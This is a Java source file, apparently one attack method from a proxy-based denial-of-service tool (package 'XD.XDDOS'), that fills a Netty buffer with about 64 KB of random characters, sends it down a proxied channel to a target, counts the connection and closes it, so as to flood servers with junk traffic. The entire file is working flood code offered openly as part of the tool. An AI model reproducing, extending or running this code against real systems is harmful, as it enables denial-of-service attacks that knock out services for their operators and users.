package XD.XDDOS.methods;

import XD.XDDOS.NettyBootstrap;
import XD.XDDOS.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;
import java.util.Random;

public class Network implements Method {
 private static Random r = new Random();  
  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    String string = "";
    for (int i = 1; i < 65536; ++i) string = string + (char) (r.nextInt(125) + 1);
    ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream out = new ByteBufOutputStream(b);
    try {
      out.writeBytes(string);
      out.close();
    } catch (IOException e) {
      e.printStackTrace();
    } 
    channel.writeAndFlush(b);
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
    channel.close();
  }
}
